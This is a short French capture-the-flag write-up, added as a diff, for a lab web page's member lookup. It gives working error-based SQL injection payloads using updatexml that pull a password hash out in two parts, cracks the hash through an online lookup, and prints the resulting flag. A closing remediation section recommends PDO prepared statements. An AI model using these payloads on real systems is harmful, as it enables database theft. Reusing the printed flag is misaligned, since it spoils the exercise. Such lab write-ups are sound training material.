@@ -1,0 +1,28 @@
+SQL INJECTIONS ERROR-Based (Membres)
+
+Se rendre sur la page http://192.168.10.22/?page=member
+Faire les injectiosn suivantes : 
+5 AND updatexml(1,concat(0x7e,(SELECT Commentaire FROM users LIMIT 3,1),0x7e),1)1"
+5 AND updatexml(1,concat(0x7e,(SELECT countersign FROM users LIMIT 3,1),0x7e),1)
+Ce qui renvoit une partie du hash => '~5ff9d0165b4f92b14994e5c685cdce2'
+Pour avoir l'autre partie restante du hash :
+5 AND updatexml(1,concat(0x7e,(SELECT SUBSTRING(countersign, 20, 40) FROM users LIMIT 3,1),0x7e),1)
+'~4e5c685cdce28~'
+
+Hash MD5 complet : 5ff9d0165b4f92b14994e5c685cdce28 
+Se rendre sur https://crackstation.net/ cela donne FortyTwo
+On met FortyTwo en minuscule (lower 'l) : fortytwo
+On obtient en SHA256 le flag
+  
+FLAG => 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+=====================================================================================================================
+
+REMEDIATION 
+Protection contre les Injections SQL (Union & Error-based)
+Le risque ici est que la saisie de l'utilisateur soit interprétée comme une commande par le moteur de base de données.
+-	Requêtes Préparées (Prepared Statements) : C'est la solution ultime. En utilisant PDO, nous séparons la structure de la requête SQL des données. Le moteur SQL compile la requête d'abord, puis insère les données comme de simples paramètres. Même si l'utilisateur tape UNION SELECT, cela sera traité comme une simple chaîne de caractères et non comme une instruction.
+
+Utilisation de marqueurs anonymes pour garantir l'étanchéité
+$stmt = $pdo->prepare("SELECT username, email FROM users WHERE id = ?");
+$stmt->execute([$_GET['id']]);
+$user = $stmt->fetch();
